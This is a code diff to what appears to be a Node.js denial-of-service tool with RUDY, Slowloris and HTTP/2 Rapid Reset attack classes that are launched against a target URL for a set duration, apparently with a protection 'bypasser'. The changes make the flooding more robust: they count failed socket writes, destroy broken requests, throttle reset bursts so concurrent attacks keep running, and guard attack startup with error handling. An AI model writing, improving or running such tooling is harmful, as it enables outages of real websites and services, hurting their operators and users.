@@ -366,7 +366,12 @@ class RudyAttack {
                 const chunk = this.largePayload.slice(bytesSent, bytesSent + chunkSize);
                 req.write(chunk);
                 bytesSent += chunkSize;
-            } catch (e) { if (timeoutId) clearTimeout(timeoutId); }
+            } catch (e) {
+                // If writing to the socket fails, count it as a failure and stop the loop.
+                this.stats.failed++;
+                if (timeoutId) clearTimeout(timeoutId);
+                if (req && !req.destroyed) req.destroy();
+            }
         };
 
         const scheduleNextChunk = () => {
@@ -455,8 +460,10 @@ class SlowlorisAttack {
                 req.write(chunk);
                 bytesSent += chunkSize;
             } catch (e) {
-                // The 'error' event will handle stat counting. Just stop the timer to prevent a crash loop.
+                // If writing to the socket fails, count it as a failure and stop the loop.
+                this.stats.failed++;
                 if (timeoutId) clearTimeout(timeoutId);
+                if (req && !req.destroyed) req.destroy();
             }
         };
 
@@ -721,7 +728,9 @@ class HTTP2RapidResetAttack {
             } catch (e) {
                 this.stats.failed += 100;
             }
-            setImmediate(sendResetBurst); // Schedule the next burst immediately
+            // Yield to the event loop to prevent starvation, especially when running with other attacks.
+            // A small delay is better than setImmediate for this purpose.
+            setTimeout(sendResetBurst, 10);
         };
         sendResetBurst();
     }
@@ -794,11 +803,15 @@ process.on('message', async ({ targetUrl, duration }) => {
     attackers.push(new HTTP2RapidResetAttack(targetUrl, threads, stats, bypasser));
 
     // Start all attackers
-    attackers.forEach(attacker => {
-        if (attacker && attacker.url) { // Check if URL was valid before starting
-            attacker.start();
-        }
-    });
+    try {
+        attackers.forEach(attacker => {
+            if (attacker && attacker.url) { // Check if URL was valid before starting
+                attacker.start();
+            }
+        });
+    } catch (e) {
+        console.error("FATAL: An unexpected error occurred while starting attacks.", e);
+    }
 
     // Set a single timeout to stop all attacks after the specified duration
     setTimeout(() => {
